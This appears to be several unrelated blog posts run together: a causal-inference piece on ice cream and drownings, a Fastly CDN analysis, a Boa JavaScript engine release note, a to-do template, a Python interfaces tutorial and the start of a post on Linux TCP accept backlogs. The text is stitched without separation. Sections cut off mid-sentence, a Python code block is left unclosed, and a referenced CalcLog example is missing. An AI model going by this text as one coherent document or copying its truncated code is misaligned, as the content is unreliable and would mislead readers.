I sure hope so; if not, I started this newsletter for nothing. The most common inference task that requires an understanding of causal relationships is a <strong>intervention recommendation task</strong>,
or a task in which an analyst must decide how best to make an intervention in order to achieve a desired outcome. For example, imagine you are now tasked with constructing a plan of action to reduce drowning deaths in Spain by 50% going into the summer of 2020. If you were to simply use your understanding of the associative relationship between ice cream consumption and drowning deaths, you could quickly propose a plan to shut down all ice cream trucks in the entire country, as that would certainly correlate with a drop in drownings! However, providing such a recommendation is a ridiculous idea, and would surely correlate with you being out of a job by the end of the week.</p><p>Associative relationships are not enough to develop the causal understandings necessary to inform intervention recommendations. In order to understand which intervention should be made to improve an outcome,
we must understand what causes the underlying processes generating our data. In our pedagogical example, changes in ice cream consumption are not causing changes in drownings simply because they are correlated.
Similarly, changes in drownings are not causing changes in ice cream consumption. Rather, it is a third variable, temperature, that is responsible for the tight correlation relation you see in this data. In future posts, I will discuss causal discovery problems, for which one can leverage a class of algorithms to automatically discover such causal relationships. For now, your key takeaway should be as follows:
<strong>Without causal inference techniques, you cannot mathematically verify that any event directly or indirectly causes any particular target event. Standard statistical analysis only enables analysts to infer associative relationships between variables.</strong> For this reason, analytical tools describing how exactly ice cream consumption and monthly drownings move together over time are not sufficient to inform policy decisions which aim to decrease drowning deaths.

  <p><span><strong>Figure 3:</strong> Causal inference has its roots in a variety of economic fields, but most early literature in the topic comes from computer science, statistics, epidemiology, and economics.</span></p></undefined><p>Causal inference has served as the primary goal of academic researchers in a variety of fields who are concerned with evaluating the resultant success of particular interventions. It helps economists determine the expected effect of a minimum wage increase in a particular US state.
It helps medical researchers estimate how much of a decrease in blood glucose level can be attributed to beginning an insulin treatment schedule.
It helps poker-playing AI software determine the effect a particular action has had on its win probability. Causal inference can be a powerful tool for business analysts, who commonly query large repositories of customer information in order to
inform a data-driven decision making process.
In this blog series, I will discuss common techniques for utilizing causal inference in a business analytics setting, mainly those leveraging artificial intelligence and machine learning to swiftly build, evaluate, and tweak intervention recommendation models to unlock latent value from large-scale data sets.</p><hr></article></div>]]>

<p>Fastly (FSLY) has experienced an incredible run over the past several weeks.  The share price has more than doubled since <a aria-label="undefined (opens in a new tab)" href="https://softwarestackinvesting.com/fastly-fsly-q1-2020-earnings-results-review/" target="_blank" rel="noreferrer noopener nofollow">releasing</a> Q1 earnings on May 6.  This can be primarily attributed to the major increase in guidance for Q2 and the rest of the year.  There have been other surprises as well, like the <a aria-label="undefined (opens in a new tab)" href="https://www.streamingmediablog.com/2020/05/fastly-amazon-homepage.html" target="_blank" rel="noreferrer noopener nofollow">observation</a> that Amazon.com has been using Fastly POPs for content delivery.  A lot of investor excitement is also pinned on the upcoming release of <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/products/edge-compute/serverless" target="_blank" rel="noreferrer noopener nofollow">Compute@Edge</a>, which represents a significant extension of Fastly’s current CDN offerings.  Since the product is in beta, it isn’t clear how sizable the revenue impact will be.  Given this, I thought it would be worth spending some time examining how Fastly has approached building new technologies in the past and what this might mean for their future edge compute offering.  I also wanted to share my understanding of the technical underpinnings of the platform and how these differ from other serverless offerings currently on the market.  Whether Fastly’s surge represents a one-time COVID-19 driven bump or they will sustain long-term usage growth remains to be seen.  With this information, investors can decide for themselves if the Fastly story is hype or their edge compute platform represents the beginning of something fundamentally disruptive.</p>



<h3>Fastly’s Roots and Bad CDNs</h3>



<p>Since its founding, there has been something different about Fastly’s mind set.  The Fastly team has a trait ingrained in their DNA to address hard technical problems with innovative and often more difficult solutions, with the goal to create a better experience for their customers.  This was applied to the CDN business originally and is now manifesting in the design of a fast, compact, secure, globally distributed serverless compute platform.  </p>



<p>Fastly was founded by Artur Bergman in 2011, directly as a consequence of his frustration with using existing CDN solutions as the CTO of <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Fandom_(website)" target="_blank" rel="noreferrer noopener nofollow">Wikia</a>, a popular hosting service for wikis.  At the time, CDN offerings were dominated by entrenched players like Akamai (AKAM), Limelight (LLNW) and even emerging CDN products from cloud vendors, such as <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Amazon_CloudFront" target="_blank" rel="noreferrer noopener nofollow">Amazon Cloudfront</a>.  As the story goes, Artur became frustrated with the capabilities of CDNs around 2010.  He complained about needing technical support to make any adjustments to his CDN configuration and long delays while changes rolled out. Existing solutions lacked programmability, a trait highly valued by the engineering teams who were increasingly getting pulled into discussions about application performance and uptime through the DevOps movement.  With a strong hands-on technical background, Artur decided that he could build a better solution and did so.   </p>



<p>Out of this Fastly was born, with an intent to find better ways to enable modern software engineering organizations to optimize the delivery of their internet applications.  This was grounded in an avoidance of the status quo and the easy path.  Fastly’s Chief Product Architect recently <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/why-edge-compute-does-not-yet-support-javascript" target="_blank" rel="noreferrer noopener nofollow">said</a> “Fastly has a long history of looking at problems from first principles and being unafraid to undertake difficult projects if we know they will benefit our customers.”  This approach reminds of <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Eric_Yuan" target="_blank" rel="noreferrer noopener nofollow">Eric Yuan</a> at Zoom Video (ZM) and his journey to build a better video conferencing solution.  At the time in 2011, it would have been easy to question why Eric thought he could improve on existing video conferencing offerings from <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Cisco_Webex" target="_blank" rel="noreferrer noopener nofollow">WebEx</a> and <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Skype" target="_blank" rel="noreferrer noopener nofollow">Skype</a>, in what many would consider a largely commoditized space.  Yet, Zoom’s success can be attributed to a highly focused and passionate drive to deliver an incrementally better experience for their users.  I posit that Fastly is doing the same for content delivery and distributed compute infrastructure with a laser focus on what is better for the developer.</p>



<h3>Applied to Network Design</h3>



<p>While Fastly was initially getting off the ground as a cash-strapped start-up, they applied this approach to the design of their content delivery network. They could have taken the common path of deploying network and server hardware in a standard configuration at many POPs across the globe.  To route traffic across the internet, they could have purchased expensive off the shelf routers.  However, the team stepped back, examined the problems they were trying to solve and designed a <a aria-label="undefined (opens in a new tab)" href="https://vimeo.com/132842124" target="_blank" rel="noreferrer noopener nofollow">different approach</a> to their content delivery network.  It didn’t hurt that they needed to preserve cash, which pushed the team towards addressing common functionality with their own custom software modules versus commercial products.  This software-driven design has paid dividends many times over, giving the team the flexibility to evolve their network design as content delivery use cases change.</p>



<p>As the first problem, the Fastly team <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://www.fastly.com/blog/building-and-scaling-fastly-network-part-1-fighting-fib" target="_blank">examined</a> approaches to handling networking traffic into and out of their POPs.  The standard configuration was to purchase border routers that can store the entire <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol" target="_blank">internet routing table</a> in memory space.  Switches were less expensive, but didn’t offer the memory or compute necessary to handle full internet routing.  In 2013, <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Arista_Networks" target="_blank">Arista Networks</a> began selling a switch that allowed users to run their own software on it.  This provided the best solution for the Fastly team.  They proceeded to write their own distributed routing agent, called Silverton, which orchestrates route configuration within Fastly POPs.  Silverton peers with the <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol" target="_blank">BGP</a> daemon, <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Bird_Internet_routing_daemon" target="_blank">BIRD</a>, which interfaces with the outside internet.  This combination allows Fastly’s customized switches to function as a more expensive border router, saving hundreds of thousands of dollars for every POP they deployed.  Also, it pushes external routing logic down to the host level, reducing load on the switches and providing more fine-grained control over traffic routing per user request.  By custom designing Silverton, the Fastly team has full control over routing management within the POP, allowing them to push network path selection to the application level and achieve far greater control over network behavior.  This has been subsequently iterated upon to selectively override route selection for certain types of content and use cases, resulting in better content delivery performance than existing solutions that generally apply a single routing rule at the border router to all cases.</p>

<p>As the next problem, the Fastly team examined the assumption that having many small POPs geographically dispersed across the globe results in the best overall delivery times for user content.  This was the approach taken by other legacy CDNs who had invested in hundreds or thousands of small POPs, spread down to the city level.  This “strength in numbers” philosophy is still presented as an advantage today by legacy players, as it is easy to make the argument that more POPs are better for performance.  Actually, this is not generally the case, as the amount of content that can be cached at each small POP is limited.  So, a significant percentage of user requests will need to be sent back to the origin servers, which will increase access times for those requests by a factor of 10x or more.  For example, if the cache miss percentage increases by just 10%, it could raise overall average access times by 50% or more.  Fastly realized that having fewer POPs with much more storage space would actually result in faster average delivery times.  In a <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/why-having-more-pops-isnt-always-better" target="_blank" rel="noreferrer noopener nofollow">blog post</a> from 2016, one of Fastly’s co-founders gave the analogy of convenient stores versus supermarkets.  While a convenience store is generally closer to a person’s home, it has a limited set of items for sale.  If the person drives a few more miles to the supermarket, they could get all of their groceries in one trip.  In this case, convenience stores represent the approach taken by the legacy CDN’s with many local POPs and the supermarkets represent Fastly’s approach with fewer, larger ones.  </p>

<p>This is why Fastly still has a limited number of POPs across the globe (<a href="https://investors.fastly.com/news/news-details/2020/Fastly-Achieves-100-Tbps-of-Edge-Capacity-Milestone/default.aspx" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">72 total</a> as of June), versus thousands advertised by competitors.  Fastly POPs are thoughtfully placed at network crossroads, where they provide proximity to geographic regions, but have the storage capacity to enable much higher hit ratios for user requests. </p>

Based on Fastly’s research, a typical hard drive could perform approximately&nbsp;450 IOPS when reading and 300-400 IOPS when writing (in a test with 4kb files).  The SSDs Fastly uses, however, execute somewhere in the region of 75,000 IOPS reading and 11,500 when writing. Making this design choice further contributed to reducing Fastly’s average response times, by making data retrieval within the POPs super fast (furthering the supermarket analogy, like having all your groceries sitting at the front door).  At the time, each server in a POP had 384 GB of RAM, and 6 TB of SSD space (made up from 12x 500 GB drives), and each CPU has 25 MB of L3 cache.  A typical POP had 32 machines spec’ed like this.  </p>



<p>But Fastly didn’t stop there.  They also wrote a custom storage engine for their POP servers to bypass the file system and squeeze every last drop of performance out of the SSDs, cramming as much data on them as possible.  They employ various algorithms to keep commonly used data in the 384 GB of RAM, making it even faster.  For some assets, such as “Like” or “Share” buttons that never change and are requested millions of times a second, they go even further by serving them out of the L3 cache directly from the processor.  </p>

    <p>Hello World!</p>

<p>Boa is an experimental Javascript lexer, parser and compiler written in Rust. It has support for some of the language, can be embedded in Rust projects fairly easily and also used from the command line.<br>
Boa also exists to serve as a Rust implementation of the EcmaScript specification, there will be areas where we can utilise Rust and its fantastic ecosystem to make a fast, concurrent and safe engine.</p>

<p>Today we’re pleased to announce our latest release, version 0.9.<br>
v0.9 is by far the biggest release we’ve had since Boa began. You can find the full changes from the <a href="https://github.com/boa-dev/boa/blob/master/CHANGELOG.md#-090-2020-06-25---move-to-organisation-78-faster-execution-time">changelog</a>. The milestone behind this version was further optimisation and an increase in new features. We can show you how we can identify areas that can be optimised.</p>



<p>Boa became the first Rust project to make use of <a href="https://github.com/rust-lang/measureme">measureme</a>, a profiling tool built from the ground up for Rust. This was only used by the Rust team themselves to profile the compiler. We managed to work with the compiler team to get the framework in a good enough state to be used by other projects too, and in this release, we gave it a try.</p>

<p>Measure me lets you profile various areas of your choosing, then you can generate a trace file which can be loaded into Chromium or various other tools for analysis.
We took it for a spin (which you’ll see in Object Specialization).</p>

<p>Below is an example of our trace, this is using a measureme tool called <code>summarize</code></p>

<div><div><pre><code>+----------------------------+-----------+-----------------+----------+------------+
| Item                       | Self time | % of total time | Time     | Item count |

+----------------------------+-----------+-----------------+----------+------------+
| create_instrinsics         | 263.50µs  | 3.756           | 6.38ms   | 1          |
+----------------------------+-----------+-----------------+----------+------------+
| make_builtin_fn: toString  | 218.50µs  | 3.114           | 290.50µs | 12         |
+----------------------------+-----------+-----------------+----------+------------+
| String                     | 81.60µs   | 1.163           | 961.60µs | 1          |
+----------------------------+-----------+-----------------+----------+------------+
</code></pre></div></div>

<p>You can read more about Rust’s usage of measureme <a href="https://blog.rust-lang.org/inside-rust/2020/02/25/intro-rustc-self-profile.html">here</a>.</p>

<h2 id="object-specialization">Object Specialization</h2>

<p>In JavaScript internal metadata for objects are stored in <code>internal slots</code>. In Boa we stored internal slots as a hashmap tied to the object, with the keys being strings and the values as <a href="https://github.com/boa-dev/boa/blob/73f65f7800917c92f86134eaa21751c1ca93d986/boa/src/builtins/value/mod.rs#L57-L78"><code>JSValues</code></a>. This meant we needed to constantly unwrap them into a Rust primitive to access the data. Secondly we were restricted as to what type of data we could put in internal slots. For example, lets say we want to implement <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"><code>Set</code></a> by using the native <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html"><code>HashSet</code></a> as a backing store, this would not be possible.</p>

<p>By changing how internal data is handled for some of our builtin objects and removing a whole bunch of redundant access checks, we managed to speed up the interpreter.</p>

<p>Boa would spend a significant amount of time converting back and forth between JS Values and primitive values. We found a huge amount of time was spent in <code>Value::set_field</code> before any code had even been executed. <code>set_field</code> was slow due to the amount of updating of internal slots as part of setting up. Here you can see realm creation takes roughly 60ms (dev build).</p>

<p><em>We use <a href="https://github.com/rust-lang/measureme/blob/master/crox/Readme.md">Crox</a> to convert our measureme data into a format Chrome’s performance tab understands</em></p>

<p><img src="https://boa-dev.github.io/images/2020-07-03/before.png" alt="Before"></p>

<p>We refactored many builtins to hold an <code>ObjectData</code> enum variant instead, some of which can hold a value for the type also.
This can be used to both identify objects and to use their internal data.<br>
Here is an example of our enum.</p>

<div><div><pre><code><span>/// Defines the different types of objects.</span>
<span>#[derive(Debug,</span> <span>Trace,</span> <span>Finalize,</span> <span>Clone)]</span>
<span>pub</span> <span>enum</span> <span>ObjectData</span> <span>{</span>
    <span>Array</span><span>,</span>
    <span>BigInt</span><span>(</span><span>RcBigInt</span><span>),</span>
    <span>Boolean</span><span>(</span><span>bool</span><span>),</span>
    <span>Function</span><span>(</span><span>Function</span><span>),</span>
    <span>String</span><span>(</span><span>RcString</span><span>),</span>
    <span>Number</span><span>(</span><span>f64</span><span>),</span>
    <span>Symbol</span><span>(</span><span>RcSymbol</span><span>),</span>
    <span>Error</span><span>,</span>
    <span>Ordinary</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://boa-dev.github.io/images/2020-07-03/after.png" alt="After"></p>

<p>This gave us a 70% speedup and reduced startup time by well over half. The <code>realm::create</code> function now runs in 13ms instead of 60ms.</p>

<h2 id="optimised-type-comparisons">Optimised Type Comparisons</h2>

<p>If you’ve ever called <code>typeof</code> in JavaScript, you get a string value describing the primitive type of it’s argument. Boa was doing the same internally for comparing (using the “get_type()” call), however getting the string value from each primitive then comparing them is not very performant.<br>
Now, thanks to @Lan2u we have a rust <a href="https://github.com/boa-dev/boa/blob/8f8498eac17164c8de2f599bd0b7ba2e8053ec30/boa/src/builtins/value/val_type.rs#L4-L17"><code>Type</code></a> enum which makes comparing more efficient and on average brings another 8% performance boost.</p>

<h2 id="jsvalue-refactor">JSValue Refactor</h2>

<p>We have completely refactored how JavaScript values are stored.<br>
<a href="https://github.com/boa-dev/boa/pull/498">#498</a> makes values more lightweight by only GC’ing objects and not the primitives. The primitive scalar values are just Rust primitives which implement the Copy trait, so the overhead of moving these around is much lower.<br>
By decoupling our <code>Value</code> types and <code>GC</code> types we have brought our <code>Value</code> size from 40 bytes =&gt; 24 bytes and an 80% reduction in arithmetic operations!</p>

<h2 id="parser-rebuild-better-code-organisation">Parser rebuild, better code organisation</h2>

<p>Boa was predominantly 3 files. The lexer, parser and interpreter.<br>
The naive implementation of the parser was a <a href="https://github.com/boa-dev/boa/blob/c23a7b1f4ac57af6c5f0b9f6c98fbbed7a14c98f/src/lib/syntax/parser.rs">single file</a> which had a long match expression for tokens and went through every token figuring out what to do. This did the job but became unmaintainable when adding new features.<br>
We have been breaking the parser up into separate modules, which represent various expressions and statements that conform to the specification. (more about this in a future post).</p>

<p>After all the fixes in this release we’ve seen on average a 70% improvement, we still have areas where we plan to improve. We are currently rebuilding the lexer so it is more broken up like the parser and interpreter, we will blog about this soon in future.</p>

<h2 id="roadmap">Roadmap</h2>

<h3 id="how-much-of-the-specification-is-covered"><em>How much of the specification is covered?</em></h3>

<p>Our next milestone is to tidy up the lexer so it takes into account <a href="https://tc39.es/ecma262/#sec-context-free-grammars"><code>goal symbols</code></a> then we plan to start running Test 262, the official ECMAScript Test Suite. It has a lot of tests (over 29272 test files) and will tell us in detail which parts of the specification need work.<br>
There are also large items like classes which are still not covered, however, these should now be easier to implement with parsing broken up.</p>

<h3 id="public-api"><em>Public API</em></h3>

<p><a href="https://github.com/boa-dev/boa/issues/445">#445</a> looks to improve the public API too so Rust projects can interactive with Boa more easily.<br>
It should be possible today to just use the lexer, parser or the whole execution path.</p>

<p>We hope to add more detail in future on how some parts of Boa work, make sure you stay tuned for any future posts!</p>

                        <p>Ironically I'm writing this post as procrastiwork, since I don't feel like doing anything that's actually <em>on</em> my to-do list.</p><p>The template will probably seem obvious, but that's kinda the point. You don't need any fancy programs —&nbsp;currently I use Apple Notes; previously Google Docs. Nor do you need to read any books about productivity.</p><p>Of course, if kanban or whatever the kids are into these days is what works for you, then do that! I've learned that I won't stick with any system that isn't exactly this basic and flexible. Something like <a href="https://fortelabs.co/blog/para/">Tiago Forte's PARA</a> is amazing, but too much for me to handle.</p><p>Anyway, the template has three main sections: Now, Soon, and Later. The exact labels can and should change — I usually do something along the lines of Today, Next Few Weeks, and To-Be-Scheduled. Currently what I've got on deck is Today plus two Later sections:</p><figure><img src="https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png" alt="" srcset="https://www.sonyasupposedly.com/content/images/size/w600/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 600w, https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 838w" sizes="(min-width: 720px) 720px"><figcaption>Sorry for the messy redaction. Btw, I don't promise to do exactly these things in exactly this order.</figcaption></figure><p>I also stick a monthly log on the end, honestly more for the satisfaction of collecting done items than anything else.</p><p>Usually I have way more Later to deal with — when tasks start to pile up I'll make a separate project-specific list, or a standalone To-Be-Scheduled list, and then get rid of it again once I've worked through the backlog.</p><p>That should give you the idea 😊 Like I said, ultra simple! Here's the template for copy-pasting:</p><h3 id="now">Now</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="soon">Soon</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="later">Later</h3><ul><li>item</li><li>item</li><li>item</li></ul>

</ul><p>Imagine a custom <em>set-like</em> data structure that doesn’t perform hashing and trades performance for tighter memory footprint. Or imagine a <em>dict-like</em> data structure that automatically stores data in a PostgreSQL or Redis database the moment you initialize it; also it lets you to <em>get-set-delete</em> key-value pairs using the usual <em>retrieval-assignment-deletion</em> syntax associated with built-in dictionaries. Custom data structures can give you the power of choice and writing them will make you understand how the built-in data structures in Python are constructed.</p>

<p>One way to understand how built-in objects like dictionary, list, set etc work is to build custom data structures based on them. Python provides several mixin classes in the <code>collection.abc</code> module to design custom data structures that look and act like built-in structures with additional functionalities baked in.</p>

<h2 id="concept-edifice">
Concept Edifice</h2>

<p>To understand how all these work, you’ll need a fair bit of knowledge about Interfaces, Abstract Base Classes, Mixin Classes etc. I’ll build the concept edifice layer by layer where you’ll learn about interfaces first and how they can be created and used via the <code>abc.ABC</code> class. Then you’ll learn how abstract base classes differ from interfaces. After that I’ll introduce mixins and explain how all these concepts can be knitted together to architect custom data structures with amazing capabilities. Let’s dive in.</p>

<h2 id="interfaces">
Interfaces</h2>

<p>Python interfaces can help you write classes based on common structures. They ensure that classes that provide similar functionalities will also have similar footprints. Interfaces are not as popular in Python as they are in other statically typed language. The dynamic nature and duck-typing capabilities of Python often make them redundant.</p>

<p>However, in larger applications, interfaces can make you avoid writing code that is poorly encapsulated or build classes that look awfully similar but provide completely unrelated functionalities. Moreover, interfaces implicitly spawn other powerful techniques like mixin classes which can help you achieve DRY nirvana.</p>

<h3 id="overview">
Overview</h3>

<p>At a high level, an interface acts as a blueprint for designing classes. In Python, an interface is basically a specialized abstract class that defines one or more abstract methods. Abstract classes differs from concrete classes in the sense that they aren’t intended to stand on their own and the methods they define shouldn’t have any implementation.</p>

<p>Usually, you inherit from an interface and implement the methods defined in the abstract class in a concrete subclass. Interfaces provide the skeletons and concrete classes provide the implementation of the methods based on those skeletons. Depending on the ways you can architect interfaces, they can be segmented into two primary categories.</p>

<ul>
  <li>Informal Interfaces</li>
  <li>Formal Interfaces</li>
</ul>

<h2 id="informal-interfaces">
Informal Interfaces</h2>

<p>Informal interfaces are classes which define methods that can be overridden, but there’s no strict enforcement.</p>

<p>Let’s write an informal interface for a simple calculator class:</p>

<div><div><pre><code><span>class</span> <span>ICalc</span><span>:</span>
    <span>"""Informal Interface: Abstract calculator class."""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>sub</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>mul</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>div</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>
</code></pre></div></div>

<p>Notice that the <code>ICalc</code> class has four different methods that don’t give you any implementation. It’s an informal interface because you can still instantiate the class but the methods will raise <code>NotImplementedError</code> if you try to apply them. You’ve to subclass the interface to use it. Let’s do it:</p>

<div><div><pre><code><span>class</span> <span>Calc</span><span>(</span><span>ICalc</span><span>):</span>
    <span>"""Concrete Class: Calculator"""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>+</span> <span>b</span>

    <span>def</span> <span>sub</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>-</span> <span>b</span>

<p>Now, you might be wondering why you even need all of these boilerplate code and inheritance when you can directly define the concrete <code>Calc</code> class and call it a day.</p>

<p>Consider the following scenario where you want to add additional functionalities to each of the method of the <code>Calc</code> class. Here, you’ve two options. Either you can mutate the original class and add those extra functionalities to the methods or you can create another class with similar footprint and implement all the methods with the added functionalities.</p>

<p>The first option isn’t always viable and can cause regression in real life scenario. The second approach ensures modularity and is generally quicker to implement since you won’t have to worry about messing up the original concrete class. However, figuring out which methods you’ll need to implement in the extended class can be hard because the concrete class might have additional methods that you don’t want in the extended class.</p>

<p>In this case, instead of figuring out the methods from the concrete <code>Calc</code> class, it’s easier to do so from an established structure defined in the <code>ICalc</code> interface. Interfaces make the process of extending class functionalities more tractable. Let’s make another class that will add logging to all of the methods of the <code>Calc</code> class:</p>

<p>In the above class, I’ve defined another class called <code>CalcLog</code> that basically extends the functionalities of the previously defined <code>Calc</code> class. Here, I’ve inherited from the informal interface <code>ICalc</code> and implemented all the methods with additional info logging capability.</p>

<p>Although writing informal interfaces is trivial, there are multiple issues that plagues them. The user of the interface class can still instantiate it like a normal class and won’t be able to tell the difference between a it and a concrete class until she tries to use any of the methods define inside the interface. Only then the methods will throw exceptions. This can have unintended side effects.</p>

<p>Moreover, informal interfaces won’t compel you to implement all the methods in the subclasses. You can easily get away without implementing a particular method defined in the interface. It won’t complain about the unimplemented methods in the subclasses. However, if you try to use a method that hasn’t been implemented in the subclass, you’ll get an error. This means even if <code>issubclass(ConcreteSubClass, Interface)</code> shows <code>True</code>, you can’t rely on it since it doesn’t give you the guarantee that the <code>ConcreteSubClass</code> has implemented all the methods defined in the <code>Interface</code>.</p>

<p>Let’s create another class <code>FakeCalc</code> an only implement one method defined in the <code>ICalc</code> abstract class:</p>

<div><div><pre><code><span>class</span> <span>FakeCalc</span><span>(</span><span>ICalc</span><span>):</span>
    <span>"""Concrete Class: Fake calculator that doesn't implement all the methods
    defined in the interface."""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>+</span> <span>b</span>

<span>print</span><span>(</span><span>cfake</span><span>.</span><span>sub</span><span>(</span><span>2</span><span>,</span> <span>3</span><span>))</span>
</code></pre></div></div>

<div><div><pre><code>3

---------------------------------------------------------------------------

NotImplementedError                       Traceback (most recent call last)

&lt;ipython-input-48-035c519cee55&gt; in &lt;module&gt;
        10 cfake = FakeCalc()
        11 print(cfake.add(1,2))
---&gt; 12 print(cfake.sub(2,3))


&lt;ipython-input-45-255c6a2093b0&gt; in sub(self, a, b)

        9
        10     def mul(self, a, b):


NotImplementedError:
</code></pre></div></div>

<p>Despite not implementing all the methods defined in the <code>ICalc</code> class, I was still able to instantiate the <code>FakeCalc</code> concrete class. However, when I tried to apply a method <code>sub</code> that wasn’t implemented in the concrete class, it gave me an error. Also, <code>issubclass(FakeCalc, ICalc)</code> returns <code>True</code> which can mislead you into thinking that all the methods of the subclass <code>FakeCalc</code> are usable. It can cause subtle bugs can be difficult to detect. Formal interfaces try to overcome these issues.</p>

<h2 id="formal-interfaces">
Formal Interfaces</h2>

<p>Formal interfaces do not suffer from the problems that plague informal interfaces. So if you want to implement an interface that the users can’t initiate independently and that forces them to implement all the methods in the concrete sub classes, formal interface is the way to go. In Python, the idiomatic way to define formal interfaces is via the <code>abc</code> module. Let’s transform the previously mentioned <code>ICalc</code> interface into a formal one:</p>

<div><div><pre><code><span>from</span> <span>abc</span> <span>import</span> <span>ABC</span><span>,</span> <span>abstractmethod</span>


<span>class</span> <span>ICalc</span><span>(</span><span>ABC</span><span>):</span>

    <p>When writing services that accept TCP connections, we tend to think of our work as starting from the point where our service accepts a new client connection and finishing when we complete the request and close the socket. For services at scale, operations can happen at such a high rate that some of the default resource limits of the Linux kernel can break this abstraction and start causing impact to incoming connections outside of that connection lifecycle. This post focuses on some standard resource limitations that exist before the client socket is handed to the application - all of which came up during the course of investigating errors on production systems as part of my role at GitHub (in some cases, multiple times across different applications).</p>

<p>In its most basic form (ignoring non-blocking variants), listening for TCP connections requires a call to <code>listen()</code> to actually start allowing incoming connections, followed by repeated calls to <code>accept()</code> to take the next pending connection and return a file descriptor that is for that particular client. In C this pattern looks something like:</p>
<div><div><pre><code><span>int</span> <span>server_fd</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>bind</span><span>(</span><span>server_fd</span><span>,</span> <span>/* ... */</span><span>);</span>

<span>// start listening for connections</span>
<span>listen</span><span>(</span><span>server_fd</span><span>,</span> <span>512</span><span>);</span>

<span>while</span> <span>(</span><span>running</span><span>)</span> <span>{</span>
    <span>// block until a connection arrives and then accept it</span>
    <span>int</span> <span>client_fd</span> <span>=</span> <span>accept</span><span>(</span><span>server_fd</span><span>,</span> <span>NULL</span><span>,</span> <span>NULL</span><span>);</span>

    <span>// ... handle client_fd ...</span>
<span>}</span>

<span>close</span><span>(</span><span>server_fd</span><span>);</span>
</code></pre></div></div>

<p>This is often hidden behind further layers of abstraction, and we tend to hide away all the implementation details of accepting connections and view it as a stream of new connections that we pick up and then process in parallel. However, when building a system that runs at a certain scale, this abstraction tends to break down because there are resource limitations introduced in the period where connections are being established but are not yet returned by <code>accept()</code>. Before that point, those client connections are considered as being part of the server/listen socket and not as independent resources exposed to the application.</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-scaling-accept">theojulienne/blog-lab-scaling-accept</a> - clone this repository bring up the lab, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-scaling-accept.git
$ cd blog-lab-scaling-accept
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="from-syn-to-accept">From SYN to accept()</h2>

<p>The Linux kernel maintains 2 queues of connections that maintain the backlog of connections that are not yet <code>accept()</code>ed by the application:</p>
<p><img alt="LISTEN backlogs" src="https://theojulienne.io/images/scaling-linux-services-before-accepting-connections/pre-accept-backlogs.png">
</p>

<p>When a SYN packet is received to initiate a new connection to a listen socket, a SYN-ACK is sent to the client and the half-completed connection state is stored in the “SYN backlog” or “Request Socket Queue”. This represents connections that have not yet been fully validated as having two-way communication between the hosts, because we haven’t yet validated that the remote end has received a packet from us (the SYN could have come from another host spoofing the source IP).</p>

<p>Once the client responds to the server’s SYN-ACK with an ACK, the connection has then completed the full <a href="https://en.wikipedia.org/wiki/Handshaking#TCP_three-way_handshake">TCP 3-way handshake</a>, and the server knows that two-way communication has been established. At this point, the client connection is ready to be provided to the application at a future call to <code>accept()</code>, and is added to the appropriately named “accept queue”.</p>

<h2 id="syn-backlog">SYN backlog</h2>

<p>Connections in the SYN backlog remain there for a period of time relative to the Round Trip Time between the server and the client. If there are N slots in the backlog then you can have at most N connections in this backlog per average RTT, after which the backlog overflows.</p>

